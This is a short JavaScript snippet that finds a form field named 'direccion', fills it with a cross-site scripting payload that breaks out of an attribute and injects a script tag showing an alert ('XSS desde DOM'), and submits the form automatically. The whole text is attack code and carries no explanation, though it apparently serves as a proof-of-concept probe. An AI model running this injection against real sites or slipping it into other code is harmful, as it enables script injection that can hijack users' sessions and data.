(function(){
  var payload=document.querySelector('[name="direccion"]');
  if(payload){
    payload.value='"><script>alert("XSS desde DOM")</script>';
    payload.form.submit();
  }
})();
